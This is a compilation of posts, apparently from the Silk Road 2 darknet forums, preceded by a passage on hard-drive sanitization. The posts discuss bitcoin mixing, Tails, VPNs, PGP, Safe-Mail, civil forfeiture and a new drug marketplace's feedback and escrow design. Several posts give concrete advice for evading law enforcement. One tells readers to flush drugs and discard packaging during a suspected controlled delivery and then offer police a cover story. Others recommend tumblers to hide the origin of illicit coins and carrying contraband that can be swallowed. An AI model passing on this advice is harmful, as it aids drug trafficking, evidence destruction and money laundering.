disk fragments become ever smaller. Destroyed disk fragments of this size have been studied by the CMRR. Magnetic microscopy is used to image stored recorded media bits.  Some storage products are more easily destroyed than hard disk drives, such as magnetic disk data cartridges, tape cartridges, secure USB drives, and optical media.  Disk Drive Degaussing  Degaussers are used to erase magnetic data on disk drives. They create high intensity magnetic fields that erase all magnetic recordings in a hard disk drive, including the sector header information on drive data tracks (information necessary for drive head positioning and data error recovery). In addition, track and disk motor magnets are often also erased by degausser magnetic fields. Like physical destruction, when a disk drive has been successfully degaussed it is no longer useable.  Drive designers continually increase the linear density of magnetic recording to create higher data storage capacity per disk. This raises the disk magnetic coercivity, the field required to write bits on the magnetic media. As the magnetic coercivity increases, the fields required to erase the data on recorded disks increases. Thus an older degausser may not fully erase data on a newer hard disk drive. New perpendicular recording drives may not be erasable by present degaussers designed for past longitudinal recording drives.  Future generations of magnetic recording media may use very high magnetic coercivity disks to achieve areal densities greater than 500 gigabits per square inch. These drives may have technology using laser light in the magnetic write element of the disk drive, to raise the temperature of a spot on the magnetic medium in order to lower the magnetic coercivity to the point where the write element can record a bit on the very high coercivity magnetic media. For disk drives using this Heat or Thermally Assisted Magnetic Recording (HAMR/TAMR) technology the degausser field required to erase the disk drive at room temperatures may be impossible or impractical to achieve. In this case the drive may have to be physically destroyed.  ""Hybrid drives"" are now being introduced for notebook or laptop computers that have flash memory write cache on hard disk drive circuit boards. Magnetic degaussing would not affect any resident data on such semiconductor memory chips. Data on these non-volatile semiconductors would have to be sanitized using some other technique. For all these reasons degaussing of all the data on hard disk drives will become increasingly impractical.  Nondestructive Data Erasure  Sanitization of data on a hard disk drive is not a simple task. Deleting a file merely removes its name from the directory structure's special disk sectors. The user data remains in the drive data storage sectors where it can be retrieved until the sectors are overwritten by new data. Reformatting a hard disk drive clears the file directory and severs the links between storage sectors, but the user data remains and can be recovered until the sectors are overwritten. Software utilities that overwrite individual data files or an entire hard drive are susceptible to error or malicious virus attack, and require constant modifications to accommodate new hardware and evolving computer operating systems. It is difficult for external software to reliably sanitize user data stored on a hard disk drive.  Many commercial software packages are available using variations of DoD 5220, making as many as 35 overwrite passes. But in today's drives, MULTIPLE OVERWRITES ARE NO MORE EFFECTIVE THAN A SINGLE OVERWRITE. Off-track overwrites could be effective in some drives, but there is no such drive external command for a software utility to move heads offtrack. And even three overwrites can take more than a day to erase a large capacity hard disk drive. In busy IT facilities, such time is often not available and IT personnel are likely to take short cuts.  DoD 5220 overwriting has other vulnerabilities, such as erasing only to a drive's Maximum Address, which can be set lower than its native capacity; not erasing reallocated (error) blocks; or miss extra partitions. External overwrites cannot access the reallocated sectors on most drives, and any data once recorded is left on these sectors. These sectors could conceivably be recovered and decoded by exotic forensics. While enterprise-class drives and drive systems (SCSI/FC/SAS/iSCSI) allow software commands to test all the user blocks for write and read ability, mass market drives (PATA/SATA) cannot read, write, or detect reassigned blocks since they have no logical block address for a user to access.",""

I wouldn't trust bending much either as it doesn't actually destroy any data and only is a physical limitation attempting to prevent forensic tools from reading the data that is still there. Grinding to microscopic bits will leave data behind as well, but it would probably be infeasible although not impossible to perform spin stand microscopy on a platter broken into hundreds of thousands of bits, since it needs to be pieced back together.

The ANSI T13.org committee oversees the ATA interface specification (also called IDE) and the ANSI T10.org committee governs the SCSI interface specification.  Secure erase is built into the hard disk drive itself and thus is far less susceptible to malicious software attack than external software utilities. The SE command is implemented in all ATA interface drives manufactured after 2001 (drives with capacities greater than 15 GB), according to testing by CMRR. A standardized internal secure erase command also exists for SCSI drives, but is optional and not currently implemented in SCSI drives tested.  Secure erase is a positive easy-to-use data destroy command, amounting to ""electronic data shredding."" Executing the command causes a drive to internally completely erase all possible user data record areas by overwriting, including g-list records that could contain readable data in reallocated disk sectors (sectors that the drive no longer uses because they have hard errors). SE is a simple addition to the existing ""format drive"" command present in computer operating systems and storage system software, and adds no cost to hard disk drives. Because the Secure Erase command is carried out within hard disk drives, no additional software is required either.  Secure erase does a single on-track erasure of the data on the disk drive. The U.S. NATIONAL SECURITY AGENCY PUBLISHED AN INFORMATION ASSURANCE APPROVAL OF SINGLE PASS OVERWRITE, AFTER TECHNICAL TESTING AT CMRR SHOWED THAT MULTIPLE ON-TRACK OVERWRITE PASSES GAVE NO ADDITIONAL ERASURE. Secure erase has been approved by the U.S. National Institute for Standards and Technology (NIST), Computer Security Resource Center. NIST document 800-88 approves SE at a higher security level than external software block overwrite utilities like as Norton Government Wipe, and it meets the legal requirements of HIPAA, PIPEDA, GLBA, and Sarbanes-Oxley.  Software overwrite utilities running in protected execution environments (e.g. running inside file system hardware like RAID arrays or inside secure computers) could be verified secure under NIST 800-88. For the most sensitive data, the government requires physical destruction of drives. Drive manufacturers today are pursuing higher security secure erase (including secret data), via in-drive data encryption (see below).  Data Encryption Secure Erase  Recently, 2.5-inch hard disk drives for laptop computers have been introduced which encrypt user data before recording -- internal full data encryption. Such drives provide protection of data should the laptop or drive be lost or stolen, and even provide high protection from forensic data recovery. These drives also offer a new, instantaneous way to sanitize data on a hard disk drive -- by securely discarding the encryption key.  Why encrypt data at rest in drives instead of in computers, such as by user application programs that access the data? Because computer level data encryption defeats the purpose of many important data management functions, such as incremental backup, continuous data protection, data compression, de-duplication, virtualization, archiving, content addressable storage, advanced routing, and thin provisioning. Defeating these operations causes significant penalties to enterprise storage companies in data access speed and cost. Each of these operations exploits the structure of user data, and needs to inspect the data. They become inefficient or nonfunctional if the data has been randomized by encryption. For example, data compression ratios may fall from more than 2:1 to less than 1:1, because compressing random data can expand it instead. De-duplication won't find identical data sets if they are encrypted by different users.  Computer level encryption could be employed with in-drive encryption as well, the double encryption does no harm and provides additional security. In-drive encryption can relieve encryption key management problems inherent in removable storage, like laptop disk drives or tape backups. In fact, hardware-based tape drive encryption may become widespread 11 by 2007 due to widely publicized losses of backup tape reels containing identity theft data on millions of people.  Full Disk Encryption (FDE) Enhanced Secure Erase (FDE-SE), securely changes the internal drive encryption key, to render encrypted user data on disk indecipherable. This is enabled via the Enhanced SE command in the present ATA ANSI specs. FDE SE encryption needs to be tested for protection against advanced forensic analysis. The results will determine the erasure security data level -- Confidential, Secret, Top Secret, or higher. The US Commerce Department prohibits most 256-bit and higher encryption export overseas, limiting FDE E-SE to AES-128-bit encryption (since disk drives are a global industry).  AES-256 bit encryption in FDE drives could allow FDE SE at a somewhat higher security level. Note that a FDE E-SE operation amounts to double AES-128, because the data encrypted by the discarded key is decrypted by the new key, and AES is a symmetric encryption scheme. It would appear that a brute force attack on double AES-128 requires the same computational effort as single AES-256. For paranoid-level security, the cypt-text in an FDE disk drive could be eliminated by a Normal OW SE done after the FDE E-SE.  An open industry standard for FDE is being worked on by the Trusted Computing Group overall specification (the Storage Working Group in trustedcomputinggroup.org). Drive members of the TCG include Seagate, HGST, Fujitsu and WD. SE via encryption may be included, consistent with the ANSI open standards for ATA drives (t13.org). CMRR has begun testing FDE-SE drives. They take less than 15 milliseconds to complete an Enhanced SE; while a 750 GB ATA-interface HDD can take over an hour to erase using conventional Secure Erase (or many hours using external overwrite software).  Computer Forensics Data Recovery  Forensics recovery uses exotic data recovery techniques by experts with advanced equipment. Its normal purpose is to recover data from failed hard disk drives, and for legal discovery. Forensic companies can successfully recover unerased but protected data in a disk drive using electronic instrumentation. However, the secure erase commands discussed above erase all user data on the disk drive beyond physical disk drive forensic recovery. Drives old enough to permit such attack are too old to have the Secure Erase built-in command.  Paranoid-level recovery concerns based on hypothetical schemes are sometimes proposed by people not experienced in actual magnetic disk recording, claiming the possibility of data recovery even after physical destruction. One computer forensics data recovery company claims to be able to read user data from a magnetic image of recorded bits on a disc, without using normal drive electronics. Reading back tracks from a disk taken out of a drive and tested on a spin stand was practical decades ago, but no longer with today's microinch-size tracks.  The time required by exotic technologies is itself a barrier to data recovery and increases data security. Also, accessing data from magnetic images requires overcoming almost a dozen successive magnetic recording technology hurdles. Even if these hurdles were overcome, about an hour would be required to recover a single user data block out of millions on a disk. Recovering substantial amounts of data in less than months requires that the disk be intact and undamaged, so that heads can be flown over it to obtain data playback signals; then overcoming these technology hurdles. Simply bending a disk makes this nearly impossible, so physical damaging drives to warp their disks makes recovery practically impossible.  Other ""experts"" claim that limited information can be recovered from unerased track edges. But this has been shown to be false by tests at CMRR. Such recovery also presumes detailed technical knowledge of the drive's magnetic recording design.

These are all competeing markets who will never outshine SR OR BMR, so they have major incentive to pull a scam and run off with everyone coins. Anyone who doesn't see this needs to wake up. There is no good end for Agora/TM/Pandora as long as SR(and possibly BMR) is alive. If this SR for whatever reason disappeared I wouldn't go near Agora/TM/Pandora with a 1000 foot pole. BMR would be the only thing I would even consider.I'm still to this day trying to fathom why so many vendors trusted sheep. With the billions of reasons there were not to trust them, so many people decided that a nice user interface made up for all the sketchy things. My eyes, just rolled out of the back of my head."

But as all transactions in the network are stored publicly in the blockchain, allowing anyone to inspect and analyze them, the system does not provide real anonymity but pseudonymity. There have already been studies showing the possibility to deanonymize bitcoin users based on the transaction graph and publicly available data. Furthermore, users could be tracked by bitcoin exchanges or shops, where they have to provide personal information that can then be linked to their bitcoin addresses. Special bitcoin mixing services claim to obfuscate the origin of transactions and thereby increase the anonymity of its users. In this paper we evaluate three of these services Bitcoin Fog, BitLaundry,  and the Send Shared functionality of Blockchain.info by analyzing  the transaction graph. While Bitcoin Fog and Blockchain.info successfully mix our transaction, we are able to find a direct relation between the input and output transactions in the graph of BitLaundry.   However that's not the end of the story, since:  Quote from: Dread Pirate Roberts on December 02, 2013, 05:05:50 pm      ""You should never rely on 1 tumbler. Bitcoinfog has known owners who can easily be bent to the will of governments to reveal data and the only repercussion of them lying about keeping logs will be non-criminal charges and we are not in a position to take them to the courts are we. If you have a single point of failure, you are entrusting your freedom to another party."" http://silkroad5v7dywlc.onion/index.php?topic=5381.0",""

Zero percent taint, maximum anonymity. Your coins are swapped for someone else's. However, you do need to trust that Send Shared does not keep logs, and also not to steal your funds. Cost is 0.5%.  Shared Coin requires less trust as it is a coinjoin mixer. Many users join together to sign one transaction. You never lose control of your coins but anonymity is not as high as Send Shared. Cost is about 0.2%.    You do not need an account at blockchain.info to use Send Shared but do for Shared Coin. Tor is fine for either but you do need to enable javascript.

I'd say between Tails & Mint, it comes down how far you want to carry yourself in regards to system hardening. Tails will be good to go right out of the box. Mint will be much less secure initially if you choose to leave things as they are. As a buyer, even using a Linux system in the first place puts you pretty far ahead in safety.

This wallet seed is totally private and the addresses it generates should theoretically be indistinguishable from random, but there is that underlying link in the manner they're generated.  A greater issue is that most bitcoin clients freely intermingle coins between addresses in a wallet. The default behavior is generally to send ""change"" outputs back to a different address in the same wallet. Not sure how Electrum functions in this regard, does anyone know?  The safest way to make sure that coins A are never linked to coins B are to use completely separate wallets A and B, and never send anything between them.

With Tails, however, everything seems to work flawlessly for me. I never boot using Tails' UEFI option though because I don't wan't UEFI to exist...it can fuck off for all I care...   Possible solution: Look in your UEFI BIOS settings for an option enabling USB legacy mode. If there is an option available that disables the UEFI boot from USB use that as well. Depending on what kind of hardware you are using, there might not even be such an option. Some hardware vendors went bad (at least with certain models) and only released dumbed down versions, so the enduser won't mess with it. M$ pays...   If this solution does not bring you any closer to success, you might have to take the long, arduous and immensely frustrating journey through the forums of the BIOS-modding community for a possible fix. Before that, do consult your hardware vendors official site for guidance, maybe they have an easier solution.  Best option would be to use coreboot, but that is even more difficult to implement and also not supported by every type of hardware. But have a look at it. Looks very cool.   Do absolutely not forget to create a backup of your bios, should you decide to mess with it. Know that your worst case scenario can be a totally bricked machine, where only some serious surgery and soldering can bring it back to life.

So, what do you think of using a VPN like hide my ass? Is it safe? Is it a problem to pay it with your credit card? I mean if cops investigate, maybe the company HMA will tell them what credit card has been used etc... When using Tails, do you need a VPN too?  I have to pay tomorrow for more monthes if I want to keep using HMA so please help me find out how to be safer on the deep weep. Thanks guys !",""

VPN providers are still quite a controversial topic, especially down here. But if you look at the folks active in the bittorrent scene, they seem to swear by it. Recently I've read about speciazed gaming VPNs offering the guaranteed fasted route to a gameserver of ones choice.  Those HMA people, sadly have been known to be cooperative with law enforcement in the past. handing over user data. The fact that any such data is even being collected by them is an absolute no go for a VPN that actually values privacy.  There are quite a few that claim they don't log anything. If theres an option to anonymously create an account paid with BTC, you could be good to go.  VPN as an additional layer of security has often been controversely discussed. I don't think there's anything close to a general consensus. Might be worth looking into, if you're willing to pay the extra money and don't mess up the configuration.

"Silk Road 2 Forums","HighGirl","66742","2014-10-20T12:26:41","Stingray: Another Reason to Ditch Your Cell","Discussion/Security","+1  I shared it with all my friends online, EVERYONE should know about this, the more people that do, the more likely something will be done about it.  I fucking hate police tactics. Some departments are okay. Where I live it's like a large city surrounded by a bunch of 'burbs and I live in one of the worst suburbs (when it comes to cops, usually the nicer the area, the more dicks they are because they have nothing to do except harass people by profiling whether it's based on race, age, how many people in the car, whatever; I haven't been pulled over since I was about 21 which has been at least 5+ years, don't want to actually say when it was and give away my age but it made me realize that I got pulled over at least 7-8x in the same suburb when I was a teen). In the city I have never had trouble with a police officer, even when I got pulled over after drinking when I was 19, they just told me to get on home, because they have bigger shit to deal with than some kid who had a beer or two. There's murders, robberies, rapes, all kinds of shit that goes down in some parts of the ""city"", but in the suburbs, EVERY cop is a dick. Where I live, if you get pulled over for ANYTHING, within 5 minutes there are at least 4 cop cars on you, so it's obvious they have nothing to do if it takes 4 cop cars (4-8 officers) to give out a speeding ticket or whatnot. And they do everything in their power to try and search your car. I remember when I was a youngin', probably 17 or 18, I was driving home at 2:30 am (I try to never drive in the suburbs past 10 or 11 if I have to carry contraband, it's not worth the risk, no matter the contraband (my state is rather lenient on marijuana possession, but they still charge you, it's just it doesn't affect your record as much as some states). Anyways this cop followed me for at least 5-10 min, and I made sure to drive at speed limit or no more than +1-2 mph, use all my turn signals, just playing it super safe to not get pulled over because my friend had a bag of some nugget in my trunk. After about 10 minutes of this following bullshit, he pulls me over and says the reason he pulled me over is because the light above my license plate was out! I was like wtf! I didn't even know there were lights over the license plate, but obviously if it took him that long to pull me over he was specifically looking for a reason to do so, otherwise he would have noticed it immediately and pulled me over. Then they ask to search the car and i tell them there's no probable cause as I only had a missing light, not even a moving violation. So then they bring out the K9 (so at this point it was very obvious this cop was trying his damndest to get something), luckily I had a hiding spot for my bowl and bud (which they searched that area for 20 min and didn't find anything), but they did find my friend's bag, because it wasn't hidden whatsoever. He took the responsibility for it as a friend should, but it's just BS how much trouble this cop went through just for the chance to find something. And OMG, he found a minor misdeameanor, good for him. Then the most annoying part was that they didn't respect my property, and this was before they knew there was anything in there. They threw papers out on the ground without stacking them (I was in high school or college at the time so that was a dick move, as those were important), they threw a ton of shit on the ground and then made me put it back. I should've told them they made the litter, either fine themselves or put it back where they found it, but I never try to make a cop more angry, it's just stupid as it makes them want to see you go in for something.  Anyways, that's just a little story to show how cops use loopholes and stuff for ""probable cause"". IIRC the Supreme Court issued a ruling a few years later that says if a cop pulls you over for speeding, they can't use that as probable cause to search your car. They could only have probable cause if they pull you over and search your car with suspicion or knowledge of contraband in the car (drugs, stolen items, weapons, etc.). But as I never have any of that stuff except contraband (and that's only when something gets picked up/dropped off, I don't carry anything with me otherwise, and if I do I make sure it's something that can be swallowed rather quickly, like recently I brought about a gram to another city 2.5 hours away from me because I was going to a concert; had we gotten pulled over, it wouldn't have been too much to just swallow.)",""

"Silk Road 2 Forums","Nightcrawler","25869","2014-02-16T11:03:14","Safe mail using tor?","Discussion/Security"," No kidding.  The fact that ""safe-mail"" has become the email provider of choice on Silk Road is a disaster in the making. I am reminded of nothing so much as the role Hushmail played in 2007, with the DEA's Operation Raw Deal (ORD).  In ORD, Hush provided the DEA with ""one stop shopping"" as it were, as all the suspects were using Hushmail. Buyers, sellers, sources of supply (SOSes) all conveniently gathered in one place -- it was a fucking turkey shoot!  The DEA boasted of having obtained in excess of 100,000 decrypted emails from Hush. Even as late as 2012 -- some 5 years later -- I was still hearing of busts taking place from the Hushmail data haul.   Sometime later this year, I think we're going to see history repeat itself, only this time, instead of Hushmail, it'll be Safe-Mail. Recent events will only make this more likely -- let me explain:   When SR1 went down, there was a frantic scramble on the part of buyers to locate vendor contact information, primarily email addresses. With the most recent events here on SR, we're seeing some people say, ""Fuck Markets!"" and vowing to conduct business over email. The loss of BMR and its Forum, and Utopia and its Forum will only exacerbate matters. As hacks and/or thefts proliferate, people are becoming leery of centralized marketplaces, so they are turning, in ever greater numbers, to older, alternative methods like email. Once again, the provider of choice seems to be Safe-Mail.   Accordingly, I suspect over the next few months, that there will be some changes to Safe-Mail's operations: we'll start seeing Tor exit nodes blocked, and perhaps even bridges. No doubt the Feds will put a bug in the ear of the Safe-Mail operators. Also, without a doubt, the carrot and the stick will be employed -- the carrot will be some type of financial incentive, and the stick will be the threat of prosecution, or some other type of governmental pressure (perhaps an audit?) for non-compliance.   So, as a result, when enough users are using Safe-Mail, then the operators suddenly make it difficult, if not impossible, to connect via Tor, meaning that the only way to connect will be directly (or via VPN) both of which mean that the user can be located/identified.  Once vendors and buyers alike are dependent on their Safe-Mail accounts for the livelihood, they cannot be abandoned easily, even in the face of the changes I have outlined.  Even a single login without using Tor is enough to give the game away.   Warrants will be easy to get: many vendors and buyers alike sport Safe-Mail addresses in their profiles. Just the appearance of a Safe-Mail address in a Silk Road profile is prima facie proof of involvement in illegal activity, which constitute grounds for issuance of a warrant.   Religious use of PGP will blunt this threat somewhat, but not completely. If you can be located/identified, then you can be raided, and forced to give up your PGP secret key and passphrase. Case in point: Ross Ulbricht. You can bet that every encrypted message he ever received has now been decrypted, and is in the hands of the Feds.   It's going to be an interesting year.

Link is on reddit page (dont post it here):   Admin has also stated commissions will be 0.7% - 5%.   http://www.reddit.com/r/ThreeHaresBazaar/comments/1s50mg/its_almost_here/","Originally we were intending on hosting hidden sites in a much large volume than we previously were. But, when the markets fell we turned our original platform into a cross between a marketplace, a bazaar, and hosting. Unless there are any issues, our primary site or the ""Bazaar"" will be open to the public without registration or login. This is both to ensure users know 100% that we can never harvest their information or steal their funds, since they don't have an account with us. If a person simply wants to trade items, not conduct a verified sale, they are free to do so in our Bazaar. This means that anybody can come to the Bazaar Trade Area, register an account, and post their product up for sale. Limit is 5 products (singular - not 5 types of strains or 5 types of pills. Each item counts as a individual item) for sale and any type of trade is allowed (currency, barter, service). All feedback from verified sales will be processed from a unique URL & code that the buyer receives after placing an order at a vendor store. Feedback is submitted via a multitude of voting fields with a large range (1 through 10) in lieu of feedback fields and buyer accounts. We have a small script that gets the value of the non-encrypted fields (all numerical) to determine if products have been sent or not. When a vendor marks a product as shipped, the buyer is sent a confirmation code. Along with the unique to vendor URL this is used to both determine vendor sales volume & let buyers submit feedback.Feedback will require a buyer to be signed up with a PGP Key & email address. As we do not have any internal means of messaging we rely on email and forums. However, due to the nature of our bazaar an email address, in some form, is required to contact the vendors. While buyers and vendors can perform transactions via the Forum PM system, it's not a substitute for a email platform.There are several secure email platforms available, and along with PGP (which we discovered all too little users actually use) is secure over nearly any platform (although some may flag an account using nothing but PGP messages, but if you are using an account that would do so -Gmail, AIM, Hotmail - you need a new provider). There are .onion, .i2p, and even proprietary encryption frameworks that allow communication over secure networks. A buyer that has more purchases will have heavier weight associated with their feedback. New vendors will have lower weight associated. Item price also plays into the feedback weight. Depending on the range (set from 1 to 100, 1 being <= $1 and 100 being >= $5,000) the feedback may have smaller or heavier weight. Each vendor has their own Panel which is visible when a user is in their selected vending category. This includes:    A link to their store and their vendor name    Their vendor/store photo/imageRatings Box * Overall Rating in % * Total Positive Volume Votes * Total Negative Volume Votes * In-Depth Details on Hover in each category * A+ to F Grade & DetailsVendor Badges16 badges that represent some form of achievement, such as requiring a pgp key, being a vendor for a certain amount of time, offering express shipping, and even some that offer warnings to users for risky vendors. While this is not to be used to judge vendors fully, it does give a buyer a good idea of the vendors dedication to their customers; and provides incentive to the vendors.The Big Four    Quality Of The Item Measured with a total value in percentages, along with total negative and positive volume votes and full details on hover.    Communication Value Measured with a total value in percentages, along with total negative and positive volume votes and full details on hover.    Stealth & Packaging Measured with a total value in percentages, along with total negative and positive volume votes and full details on hover.    Shipping Quality & Speed Measured with a total value in percentages, along with total negative and positive volume votes and full details on hover.The bottom consists of a link to text feedback from the vendors past sales, a read-only text box with the vendors store URL, and a status box where vendors can display a small message (intended for ""away"" messages, specials, promotions, or PR).Vendor are free to use any type of cryptocurrency they feel appropriate, including but not limited to Bitcoins, Litecoins, Namecoins, and Peercoins. However, our resolution center only supports the previously mentioned 4 currency types, so any dealings outside of those will not be covered by our resolution, however all buyers can still leave feedback regardless of currency used.On the vendors side, they get their own unique .onion domain and .i2p domain with a vendor store. Each vendor is isolated from the other through use of live encryption (and flat file architecture for faster response times, as CryptDB has very slow load times) and VM shielding. We do host multiple accounts on a single host platform, however these are limited to a preset amount of vendor stores and we will either simply activate more or purchase more, depending on the scale up required.Our uptime is estimated at 96.5% for vendor stores and 97.5% for the Bazaar. This is due to the fact multiple VPN & networking interfaces are active on each vendor account through multiple types of traffic (i2p, TOR) and at times some vendors may experience a slow load time resulting in timeout. This is due to server resource balancing - while each vendor has a higher peak than their regular usage amount, if multiple vendors peak at the same time the system will start rationing resources resulting in slow loads and form errors.As for escrow, we will be offering multiple methods (although none associate funds with us) of escrow to use as well as escrow agents. Escrow types range from 2 Factor, 3 Factor, Multisig, and Clearnet. We will be providing the URL and information about all services we know (and can verify), a well as offering open source platforms for the community for escrow (see our Bazaar Trades)."

As someone who just lost $2500, I would be rather keen to see this done.  I know others got hit way worse.  Maybe some guys with deeper pockets might entice some superstar to hook us up.  It would be nice to know that it is a logical certainty that this can never happen again.",""

(correct me if I""m wrong..)But you just simply walking to your mailbox and taking a package inside does not prove that you INTENDED ON RECEIVING that package; they use the second method I speak of so they know that you open the package (and how long it took etc); however, I would argue that I get a lot of packages, and I don't track things, so I got a package in the mail and opened it...however, they're going to see when you opened it, then wait probably and then come in and see what you did with the product etc.   That's why IMO IF YOU EVER FEEL SOMETHING SKETCHY IS GOING ON, take the package, go inside and open in a normal timely manner, and then when you see the ""drugs"" to whatever in it bring it to the toilet and FLUSH and throw away the packaging; that way when they come in you say you opened it, saw some drugs or something weird and flushed it and threw it out.  Some also like to keep their packages for ~2 days before opening them, etc.  Just always be on the lookout (casual look out, you don't want to look suspicious) when getting things form your mailbox.  And again, it's usually people that are getting large quantities of things that this gets done to, they don't have the funds to do this for people ordering a gram of weed (nor would a judge waste their time on a case they didnt' think was solid/worth it).  ~FARM (a little out of my mind if some of that didn't make sense sorry   )","Quote from: WhereTheLeanAt2 on March 19, 2014, 04:44:22 amI just have a question for all Americans (specifically U.S.) Packages/envelopes with small personal amounts of any drug (say mdma or weed) would they just send you a ""love letter"" or would they actually use the resources to conduct a CD? 2nd question - they do conduct a CD and they knock on the door, you answer, and they ask you to sign for the package and you politely say ""Oh, we weren't expecting a package, just return it to the sender please."" and shut the door (not in a hasty manner) before they can say anything else - what could they do from there?

I don't think there is a definitive answer to either question. If its a couple grams of weed or a little bit of molly I have a hard time believing LE would waste the resources necessary to conduct a CD, especially given the relatively large amount of additional resources required to prosecute a ""gray-area"" crime like receiving drugs in the mail. If you took proper precautions, all they should theoretically have on you is that a package with drugs was delivered to your mailbox. If I had to put my money on it, I'd say you'd just get a love letter.  As for your second question, unless they had a warrant they couldn't do shit. Although you should note that simply refusing to sign for a package isn't exactly a get-out-of-jail-free card. Some people say not signing for a package doesn't protect you from jack, but I know for a fact that this is not the case based on the experiences of some people I know.

For example, if someone orders a lb of weed and the police say this has such and such a street price if resold... they will weigh that up against the cost of the manpower and other costs it takes to make the arrest. They cannot be going around arresting every person who orders an 1/8th of bud or a couple of grams of Molly.   To make the arrest that can do it in a bunch of different ways. Usually with packages of a large size the buyer will input a false name. If this is the case then the ""Oh, I wasn't expecting anything"" would probably work. However, I read somewhere recently that the police put something on the inside of the package, so they know when the person opened it. That way, even if the name is different from your own, they can say that you were in fact expecting it and used a fake name because opening other peoples mail is illegal. ",""

Money/Cash can be seized just on mere  suspicion that it was the proceeds of crime.  The cases are literally legion:   * A black man who owned a nursery business, who was carrying a large amount of cash, and traveling by air to visit growers to purchase stock for his nursery business. Because he paid in cash for his airline ticket, the ticket agent notified the authorities, who took the man into custody and seized his cash. He could prove the cash was obtained legitimately, but this made no difference to the pigs who seized his money. He was never charged with a crime, let alone convicted.   * A woman who worked as a maid in  New York hotel, got a settlement as the result of an injury. She converted the settlement into cash, and she also traveled by air across the country. Somehow she was discovered carrying a large amount of cash, and the authorities seized it, even though she had documentation proving that she had legitimately obtained the money.   * A elderly couple in a small Florida town had a mentally disturbed son, who liked to smoke weed.  The son even grew some in the backyard -- when his father found out, he threatened to cut it down, and the son said if he did that, he would kill himself. Eventually the son was arrested on a drug charge, and it came out that the father knew abut the son's small weed crop in the backyard. The son was tried, convicted, and sentenced to probation, on condition that he attend counseling sessions -- he did, and the family thought that was the end of the matter. Several years later, just before the statute of limitations ran out, an officer in the local force was going through old convictions looking for forfeiture opportunities, and he stumbled across the case of this elderly couple and their son.   Because it had come out that the father knew of the son's little weed patch, it was determined that the house fair game, as it was the proceeds of crime, and the couple's house was seized and forfeited to the government -- they were given one month to move. before the state took possession of the house.

Civil forfetiure has become a major revenue generator for many law enforcement organizations, in the United States. In some, it can constitute up to 40% of their annual operating budget.  Just to show you how absurd things have become, I believe it was Rudy Guiliani who proposed to curb prostitution by seizing the cars that Johns used to travel in to meet hookers. I did a search to see if this was ever implemented, and it appears that it was.   On the nyc.gov web site, the Civil Enforcement Unit (CEU) outlines their mandate, which includes the following statement:    So, get stopped for a traffic offense, find a joint in the car, kiss the car goodbye.  God Bless America!

Where security differs from religion is that security is NOT retroactive.  Unlike Christianity, where you can come to Jesus, be 'saved' and have all  your sins washed away, with security you can adopt Tails or PGP, and be  secure from that point forward, but rest assured that your previous sins  (security failings) WILL come back to haunt you and bite you in the ass.  The original DPR is the poster child for that, right now.  Folly, thou conquerest, and I must yield! Against stupidity the very gods Themselves contend in vain.  --Friedrich Schiller ","Quote from: Nightcrawler on February 21, 2014, 05:39:30 pmThe authorities' attitude seems to be: Seize first, and let the victim prove the seizure was illegitimate in court.  Here's another typical case. Guy goes to visit his girlfriend in Canada, returns home, and has luggage inspected by Customs. Thoughtless boyfriend put styptic powder in a ziploc bag in his shaving kit. When Customs officer finds this, he screams, ""Drugs!""  Man is handcuffed, arrested, and strip-searched. His vehicle is also searched. Civil forfeiture proceedings are initiated on his car, because it was used to transport the 'contraband' -- so the car is an accessory to the 'crime'.  Three months later, man gets a letter in the mail with the lab results: NO NARCOTICS FOUND. Charges are dropped, but it takes another full year and $10,000 in legal fees to get the car back. Now I am fucking pissed.;Another CEU initiative, ""Operation Losing Proposition,"" focuses on the seizure and forfeiture of the cars of ""johns"", the prostitutesâ customers, thereby deterring street prostitution. Other examples of the Unitâs forfeiture work include forfeiting the expensive tools of chop shop operators, vehicles involved in dangerous drag racing on public streets and vehicles of individuals who are found to be in possession of controlled substances or marijuana in their vehicles after a lawful stop.  The list of examples is without end as the CEU is legally authorized to pursue forfeiture of any property which was used to facilitate a crime or constitutes the proceeds of a crime and the list grows as crime conditions change.

If tainted coins should travel around the network and ultimately end up in your hands (even legitimately), this means the Feds can swoop in to grab your digital money.Over at BusinessWeek, Peter Coy describes how that works:This is Bitcoinâs nemo dat quod non habet problem, that being Latin for an old principle of English common law: âNo one gives what he does not have.â If the drug lord didnât legitimately own the Bitcoins in question because he got them via crime, then he canât legitimately give them to you. You must give them up even if youâre not at fault. The same principle is at play when certain unwitting art buyers are forced to surrender works that were seized by the Nazis in World War II.Alex Daley, chief technology strategist of Casey Research, a financial research firm, says that the FBI already owns between 5% and 10% of all Bitcoins."

"Silk Road 2 Forums","pabloescobar","39338","2014-05-04T11:16:41","PGP and signing","Discussion/Security","This solved my problem and is a god guide for the PGP process within TAILS ","Yo bitches, imma make a guide fo da PGP Tool dat cums togetah with TAILS. 'Cause y'all niggas need 2 be safe.Jokes apart, the official guide on the TAILS website sucks really hard and I know you don't like to waste your time so you should be OK pretty much by just looking at pictures but here's a direct guide to the tool anyways. Oh one more thing, I won't explain verification, just send-receive basic stuff. Enough with the bullshit, let's just start:(1) Create a pair of Keys-In order to receive messages, you have to create a pair of Public/Private keys. The vendor will then use your Public Key to message you (I will teach you how to export it later). To do so, click on the Clipboard icon in the top bar and select ""Manage Keys""http://i.imgur.com/dsfww1x.png- Switch to the ""My personal keys"" tab. Click File -> New -> PGP Keyhttp://i.imgur.com/6dLGEjD.pnghttp://i.imgur.com/85rpx7y.png- You can choose the name but I suggest using your username. Key Strength 4096 should be enough, click Create.http://i.imgur.com/K1NHl2a.png- Choose the friggin' passphrase and damn don't forget it, then wait for it to generate the key. Don't worry, it won't last long.http://i.imgur.com/JISROGa.pnghttp://i.imgur.com/fyMunOq.png- To put your public key on your profile, or give it to someone else, right click your key and choose copy. You can paste it wherever you need to (but if you're going to paste it into reddit, see the ""Error?"" section).(2) Exporting/Importing your private keyIf this is not a throwaway key, I highly recommend to export it. This is because if you don't, even when you create a new key using the same parametres it will never be the same key and you will never be able to decrypt your messages once it gets deleted. Now, do you remember the ""Export"" thing that appeared when you were copying your key? Yeah, forget that. That will only export your public key. You need to export the private one. So here's how to do it:- On the ""My personal keys"" tab, right click on your key and select Properties.http://i.imgur.com/eMRvGhX.png- Switch to the ""Details"" tab, then select ""Export Complete Key"". I'd suggest to save it on a USB stick or something else safe, that only you will use and that is easy to destroy.http://i.imgur.com/EO9jxNL.pnghttp://i.imgur.com/rmHz11c.png-Every time you boot TAILS and the previous key has been deleted, you just plug the USB stick and right click on the exported keys you need to import, then select ""Open with Import Key"".(3) I want to message a vendor/guy.- Go into their vendor profile and copy their public key, including the lines where it says ""begin pgp public key block"" and ""end pgp public key 